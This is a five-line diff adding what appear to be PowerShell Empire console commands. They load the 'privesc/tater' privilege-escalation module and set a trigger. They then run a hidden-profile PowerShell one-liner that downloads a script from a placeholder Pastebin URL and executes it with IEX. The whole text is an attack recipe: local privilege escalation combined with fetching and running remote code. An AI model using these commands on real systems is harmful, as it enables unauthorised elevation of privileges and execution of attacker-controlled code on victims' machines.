@@ -1,0 +1,5 @@
+usemodule privesc/tater
+Set Trigger 2
+set Command powershell -nop -c (IEX (New-Object Net.WebClient).DownloadString('<PasteBin URL>’'))
+execute
+back
